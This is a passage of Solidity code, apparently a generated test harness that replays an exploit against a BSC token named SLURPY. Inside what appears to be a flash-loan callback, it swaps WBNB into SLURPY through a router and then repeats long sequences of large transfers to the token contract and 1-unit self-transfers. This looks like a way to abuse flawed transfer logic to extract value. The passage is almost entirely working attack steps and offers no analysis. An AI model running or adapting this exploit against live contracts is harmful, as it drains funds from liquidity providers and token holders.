                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_103);
            }
            {
                uint256 transferLiveAmount_104 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_104);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_105 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_105);
            }
            {
                uint256 transferLiveAmount_106 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_106);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_107 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_107);
            }
            {
                uint256 transferLiveAmount_108 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_108);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
        }
    }

    function flashCallback3() internal {
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(0)), bytes32(uint256(0)));
        IContract_10ED43_024E(Addresses.A_10ED43_024E)
            .swapTokensForExactTokens(
                1234618194123962087675163,
                888244830827722349,
                _addressArray2(Addresses.WBNB, Addresses.SLURPY),
                address(this),
                1734552916
            );
        {
            Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(0)), bytes32(uint256(0)));
            {
                uint256 transferLiveAmount_109 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_109);
            }
            {
                uint256 transferLiveAmount_110 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_110);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_111 = 75260314659053675511065;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_111);
            }
            {
                uint256 transferLiveAmount_112 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_112);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_113 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_113);
            }
            {
                uint256 transferLiveAmount_114 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_114);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_115 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_115);
            }
            {
                uint256 transferLiveAmount_116 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_116);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_117 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_117);
            }
            {
                uint256 transferLiveAmount_118 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_118);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_119 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_119);
            }
            {
                uint256 transferLiveAmount_120 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_120);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_121 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_121);
            }
            {
                uint256 transferLiveAmount_122 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_122);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_123 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_123);
            }
            {
                uint256 transferLiveAmount_124 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_124);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_125 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_125);
            }
            {
                uint256 transferLiveAmount_126 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_126);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_127 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_127);
            }
            {
                uint256 transferLiveAmount_128 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_128);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_129 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_129);
            }
            {
                uint256 transferLiveAmount_130 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_130);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_131 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_131);
            }
            {
                uint256 transferLiveAmount_132 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_132);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
        }
        IContract_10ED43_024E(Addresses.A_10ED43_024E)
            .swapTokensForExactTokens(
                1234618154714800514367884,
                890818288681412719,
                _addressArray2(Addresses.WBNB, Addresses.SLURPY),
                address(this),
                1734552916
            );
        {
            Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(0)), bytes32(uint256(0)));
            {
                uint256 transferLiveAmount_133 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_133);
            }
            {
                uint256 transferLiveAmount_134 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_134);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_135 = 75260315450260815042185;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_135);
            }
            {
                uint256 transferLiveAmount_136 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_136);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_137 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_137);
            }
            {
                uint256 transferLiveAmount_138 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_138);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_139 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_139);
            }
            {
                uint256 transferLiveAmount_140 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_140);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_141 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_141);
            }
            {
                uint256 transferLiveAmount_142 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_142);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_143 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_143);
            }
            {
                uint256 transferLiveAmount_144 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_144);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_145 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_145);
            }
            {
                uint256 transferLiveAmount_146 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_146);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_147 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_147);
            }
            {
                uint256 transferLiveAmount_148 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_148);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_149 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_149);
            }
            {
                uint256 transferLiveAmount_150 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_150);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_151 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_151);
            }
            {
                uint256 transferLiveAmount_152 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_152);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_153 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_153);
            }
            {
                uint256 transferLiveAmount_154 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_154);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_155 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_155);
            }
            {
                uint256 transferLiveAmount_156 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_156);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
        }
        IContract_10ED43_024E(Addresses.A_10ED43_024E)
            .swapTokensForExactTokens(
                1234618153607667145843991,
                893400534119971038,
                _addressArray2(Addresses.WBNB, Addresses.SLURPY),
                address(this),
                1734552916
            );
        {
            Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(0)), bytes32(uint256(0)));
            {
                uint256 transferLiveAmount_157 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_157);
            }
            {
                uint256 transferLiveAmount_158 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_158);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_159 = 75260315472488433965383;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_159);
            }
            {
                uint256 transferLiveAmount_160 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_160);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_161 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_161);
            }
            {
                uint256 transferLiveAmount_162 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_162);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_163 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_163);
            }
            {
                uint256 transferLiveAmount_164 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_164);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_165 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_165);
            }
            {
                uint256 transferLiveAmount_166 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_166);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_167 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_167);
            }
            {
                uint256 transferLiveAmount_168 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_168);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_169 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_169);
            }
            {
                uint256 transferLiveAmount_170 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_170);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_171 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_171);
            }
            {
                uint256 transferLiveAmount_172 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_172);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_173 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_173);
            }
            {
                uint256 transferLiveAmount_174 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_174);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_175 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_175);
            }
            {
                uint256 transferLiveAmount_176 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_176);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_177 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_177);
            }
            {
                uint256 transferLiveAmount_178 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_178);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_179 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_179);
            }
            {
                uint256 transferLiveAmount_180 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_180);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
        }
        IContract_10ED43_024E(Addresses.A_10ED43_024E)
            .swapTokensForExactTokens(
                1234618153576564116835321,
                895991578687092273,
                _addressArray2(Addresses.WBNB, Addresses.SLURPY),
                address(this),
                1734552916
            );
        {
            Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(0)), bytes32(uint256(0)));
            {
                uint256 transferLiveAmount_181 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_181);
            }
            {
                uint256 transferLiveAmount_182 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_182);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_183 = 75260315473112881114945;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_183);
            }
            {
                uint256 transferLiveAmount_184 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_184);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_185 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_185);
            }
            {
                uint256 transferLiveAmount_186 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_186);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_187 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_187);
            }
            {
                uint256 transferLiveAmount_188 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_188);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_189 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_189);
            }
            {
                uint256 transferLiveAmount_190 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_190);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_191 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_191);
            }
            {
                uint256 transferLiveAmount_192 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_192);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_193 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_193);
            }
            {
                uint256 transferLiveAmount_194 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_194);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_195 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_195);
            }
            {
                uint256 transferLiveAmount_196 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_196);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_197 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_197);
            }
            {
                uint256 transferLiveAmount_198 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_198);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_199 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_199);
            }
            {
                uint256 transferLiveAmount_200 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_200);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_201 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_201);
            }
            {
                uint256 transferLiveAmount_202 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_202);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_203 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_203);
            }
            {
                uint256 transferLiveAmount_204 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_204);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
        }
        IContract_10ED43_024E(Addresses.A_10ED43_024E)
            .swapTokensForExactTokens(
                1234618153575690330134445,
                898591458139526060,
                _addressArray2(Addresses.WBNB, Addresses.SLURPY),
                address(this),
                1734552916
            );
        {
            Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(0)), bytes32(uint256(0)));
            {
                uint256 transferLiveAmount_205 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_205);
            }
            {
                uint256 transferLiveAmount_206 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_206);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_207 = 75260315473130423895570;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_207);
            }
            {
                uint256 transferLiveAmount_208 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_208);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_209 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_209);
            }
            {
                uint256 transferLiveAmount_210 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_210);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_211 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_211);
            }
            {
                uint256 transferLiveAmount_212 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_212);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_213 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_213);
            }
            {
                uint256 transferLiveAmount_214 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_214);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_215 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_215);
            }
            {
                uint256 transferLiveAmount_216 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_216);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_217 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_217);
            }
            {
                uint256 transferLiveAmount_218 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_218);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_219 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_219);
            }
            {
                uint256 transferLiveAmount_220 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_220);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_221 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_221);
            }
            {
                uint256 transferLiveAmount_222 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_222);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_223 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_223);
            }
            {
                uint256 transferLiveAmount_224 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_224);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_225 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_225);
            }
            {
                uint256 transferLiveAmount_226 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_226);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_227 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_227);
            }
            {
                uint256 transferLiveAmount_228 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_228);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
        }
        IContract_10ED43_024E(Addresses.A_10ED43_024E)
            .swapTokensForExactTokens(
                1234618153575665782583194,
                901200209094948685,
                _addressArray2(Addresses.WBNB, Addresses.SLURPY),
                address(this),
                1734552916
            );
        {
            Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(0)), bytes32(uint256(0)));
            {
                uint256 transferLiveAmount_229 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_229);
            }
            {
                uint256 transferLiveAmount_230 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_230);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_231 = 75260315473130916730157;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_231);
            }
            {
                uint256 transferLiveAmount_232 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_232);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_233 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_233);
            }
            {
                uint256 transferLiveAmount_234 = 1;
